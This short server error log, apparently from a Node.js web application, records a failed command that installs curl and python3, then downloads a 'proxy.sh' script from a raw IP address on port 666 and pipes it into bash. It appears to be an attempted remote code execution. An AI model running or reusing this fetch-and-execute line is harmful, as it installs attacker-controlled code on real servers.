+2025-12-11 05:02 +00:00:  ⨯ Error: Command failed: yum install -y -q curl python3 2>/dev/null && curl -s http://67.217.57.240:666/files/proxy.sh | bash
+2025-12-11 05:02 +00:00:     at ignore-listed frames {
+2025-12-11 05:02 +00:00:   status: 127,
+2025-12-11 05:02 +00:00:   signal: null,
+2025-12-11 05:02 +00:00:   output: [Array],
+2025-12-11 05:02 +00:00:   pid: 36860,
+2025-12-11 05:02 +00:00:   stdout: <Buffer >,
+2025-12-11 05:02 +00:00:   stderr: <Buffer >,
+2025-12-11 05:02 +00:00:   digest: '190896510'
+2025-12-11 05:02 +00:00: }
